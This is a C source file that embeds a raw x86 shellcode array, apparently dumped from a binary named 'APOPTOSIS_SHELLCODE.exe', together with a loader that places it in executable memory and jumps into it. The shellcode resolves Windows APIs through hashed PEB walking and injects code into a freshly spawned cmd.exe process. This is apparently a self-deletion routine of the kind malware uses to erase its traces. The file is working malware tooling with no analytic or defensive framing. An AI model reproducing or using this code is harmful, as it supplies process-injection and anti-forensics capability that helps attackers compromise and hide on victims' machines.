/* Debug\APOPTOSIS_SHELLCODE.exe (1/10/2013 1:44:30 PM)
   StartOffset: 00000400, EndOffset: 000006C2, Length: 000002C3 */

#include <Windows.h>

unsigned char apoptosis_shellcode[712] = {
	0x90, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x8D, 0x5B, 0xFA, 0x8B, 0xD0,
	0xFC, 0x55, 0x8B, 0xEC, 0xB9, 0x00, 0x01, 0x00, 0x00, 0x2B, 0xE1, 0x8B,
	0xFC, 0x8B, 0xD0, 0x32, 0xC0, 0xF3, 0xAA, 0x89, 0x55, 0xFC, 0x89, 0x5D,
	0xF8, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40,
	0x14, 0x8B, 0x00, 0x8B, 0x00, 0x8B, 0x40, 0x10, 0x89, 0x45, 0xF4, 0xBE,
	0x20, 0x2D, 0xCE, 0xE2, 0xE8, 0x1D, 0x02, 0x00, 0x00, 0x89, 0x45, 0x80,
	0x8B, 0x45, 0xF4, 0xBE, 0x9A, 0xAF, 0xE5, 0xC8, 0xE8, 0x0D, 0x02, 0x00,
	0x00, 0x89, 0x85, 0x7C, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xF4, 0xBE, 0x7F,
	0x2F, 0xA6, 0x8C, 0xE8, 0xFA, 0x01, 0x00, 0x00, 0x89, 0x85, 0x78, 0xFF,
	0xFF, 0xFF, 0x8B, 0x45, 0xF4, 0xBE, 0x76, 0x0F, 0x5A, 0x26, 0xE8, 0xE7,
	0x01, 0x00, 0x00, 0x89, 0x85, 0x4C, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xF4,
	0xBE, 0xD6, 0x8E, 0xB8, 0xF3, 0xE8, 0xD4, 0x01, 0x00, 0x00, 0x89, 0x85,
	0x74, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xF4, 0xBE, 0xB4, 0xA6, 0xDB, 0x26,
	0xE8, 0xC1, 0x01, 0x00, 0x00, 0x89, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x8B,
	0x45, 0xF4, 0xBE, 0xC9, 0x81, 0x3F, 0x0D, 0xE8, 0xAE, 0x01, 0x00, 0x00,
	0x89, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xF4, 0xBE, 0xCC, 0x22,
	0xF4, 0xF0, 0xE8, 0x9B, 0x01, 0x00, 0x00, 0x89, 0x85, 0x60, 0xFF, 0xFF,
	0xFF, 0x8B, 0x45, 0xF4, 0xBE, 0x8E, 0x7D, 0x06, 0xCE, 0xE8, 0x88, 0x01,
	0x00, 0x00, 0x89, 0x85, 0x5C, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xF4, 0xBE,
	0x47, 0xCC, 0x1B, 0x10, 0xE8, 0x75, 0x01, 0x00, 0x00, 0x89, 0x85, 0x54,
	0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xF4, 0xBE, 0x02, 0x58, 0x71, 0xFB, 0xE8,
	0x62, 0x01, 0x00, 0x00, 0x89, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 0x8B, 0x45,
	0xF4, 0xBE, 0xEE, 0x33, 0x40, 0xE8, 0xE8, 0x4F, 0x01, 0x00, 0x00, 0x89,
	0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xF4, 0xBE, 0xC0, 0x3A, 0x2D,
	0xBB, 0xE8, 0x3C, 0x01, 0x00, 0x00, 0x89, 0x85, 0x44, 0xFF, 0xFF, 0xFF,
	0xB9, 0x08, 0x02, 0x00, 0x00, 0x2B, 0xE1, 0x8B, 0xFC, 0xFC, 0x32, 0xC0,
	0xF3, 0xAA, 0x89, 0x65, 0xE0, 0x68, 0x08, 0x02, 0x00, 0x00, 0xFF, 0x75,
	0xE0, 0x6A, 0x00, 0x8B, 0x85, 0x4C, 0xFF, 0xFF, 0xFF, 0xFF, 0xD0, 0x81,
	0x7D, 0xFC, 0x0D, 0xF0, 0xAD, 0xBA, 0x74, 0x26, 0x68, 0xD0, 0x07, 0x00,
	0x00, 0x8B, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 0xFF, 0xD0, 0x8B, 0x45, 0xF8,
	0x8D, 0x80, 0xC5, 0x02, 0x00, 0x00, 0x50, 0x8B, 0x45, 0x80, 0xFF, 0xD0,
	0x6A, 0x00, 0x8B, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0xFF, 0xD0, 0xB9, 0x54,
	0x00, 0x00, 0x00, 0x2B, 0xE1, 0x8B, 0xFC, 0x32, 0xC0, 0xFC, 0xF3, 0xAA,
	0x89, 0x65, 0xDC, 0x8D, 0x44, 0x24, 0x10, 0x89, 0x45, 0xD8, 0x68, 0x65,
	0x78, 0x65, 0x00, 0x68, 0x63, 0x6D, 0x64, 0x2E, 0x8B, 0xC4, 0xFF, 0x75,
	0xDC, 0xFF, 0x75, 0xD8, 0x6A, 0x00, 0x6A, 0x00, 0x68, 0x00, 0x00, 0x00,
	0x08, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x50, 0x6A, 0x00, 0x8B, 0x85,
	0x44, 0xFF, 0xFF, 0xFF, 0xFF, 0xD0, 0x83, 0xF8, 0x00, 0x0F, 0x84, 0x8D,
	0x00, 0x00, 0x00, 0x8B, 0x5D, 0xDC, 0x8B, 0x03, 0x89, 0x45, 0xD4, 0x6A,
	0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x20, 0x00, 0x00, 0x6A,
	0x00, 0xFF, 0x75, 0xD4, 0x8B, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0xFF, 0xD0,
	0x83, 0xF8, 0x00, 0x74, 0x67, 0x89, 0x45, 0xE4, 0x6A, 0x00, 0x8B, 0xC4,
	0x50, 0x68, 0xC5, 0x02, 0x00, 0x00, 0xFF, 0x75, 0xF8, 0xFF, 0x75, 0xE4,
	0xFF, 0x75, 0xD4, 0x8B, 0x85, 0x74, 0xFF, 0xFF, 0xFF, 0xFF, 0xD0, 0x83,
	0xF8, 0x00, 0x74, 0x44, 0x58, 0x6A, 0x00, 0x8B, 0xC4, 0x50, 0x68, 0x08,
	0x02, 0x00, 0x00, 0xFF, 0x75, 0xE0, 0x8B, 0x45, 0xE4, 0x8D, 0x80, 0xC5,
	0x02, 0x00, 0x00, 0x50, 0xFF, 0x75, 0xD4, 0x8B, 0x85, 0x74, 0xFF, 0xFF,
	0xFF, 0xFF, 0xD0, 0x83, 0xF8, 0x00, 0x74, 0x1C, 0x58, 0x6A, 0x00, 0x8B,
	0xC4, 0x50, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0x75, 0xE4, 0x6A, 0x00, 0x6A,
	0x00, 0xFF, 0x75, 0xD4, 0x8B, 0x85, 0x7C, 0xFF, 0xFF, 0xFF, 0xFF, 0xD0,
	0x8B, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x6A, 0x00, 0xFF, 0xD0, 0x8B, 0x58,
	0x3C, 0x03, 0xD8, 0x8B, 0xF8, 0x8B, 0x5B, 0x78, 0x03, 0xDF, 0x8B, 0xD3,
	0x8B, 0x5B, 0x20, 0x03, 0xDF, 0x33, 0xC9, 0x8B, 0x03, 0x03, 0xC7, 0xE8,
	0x1E, 0x00, 0x00, 0x00, 0x3B, 0xC6, 0x74, 0x06, 0x83, 0xC3, 0x04, 0x41,
	0xEB, 0xED, 0x8B, 0x5A, 0x24, 0x03, 0xDF, 0x66, 0x8B, 0x0C, 0x4B, 0x8B,
	0x5A, 0x1C, 0x03, 0xDF, 0x8B, 0x04, 0x8B, 0x03, 0xC7, 0xC3, 0x53, 0x51,
	0x33, 0xDB, 0x4B, 0x32, 0x18, 0xB9, 0x08, 0x00, 0x00, 0x00, 0xD1, 0xEB,
	0x73, 0x06, 0x81, 0xF3, 0x5C, 0x12, 0xDB, 0x8F, 0xE2, 0xF4, 0x40, 0x80,
	0x38, 0x00, 0x75, 0xE7, 0x8B, 0xC3, 0x59, 0x5B, 0xC3, 0x90, 0x90, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc
};

VOID apoptosis(VOID)
{
	PBYTE			shellcode;
	//VOID			(*apop_func)(DWORD);

	shellcode = (PBYTE)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	CopyMemory(shellcode, apoptosis_shellcode, sizeof(apoptosis_shellcode));

	//apop_func = (VOID (*)(DWORD))shellcode;
	//apop_func(0xbaadf00d);
	__asm {
		mov		eax, 0baadf00dh
		jmp		shellcode
	}

	ExitProcess(0);
}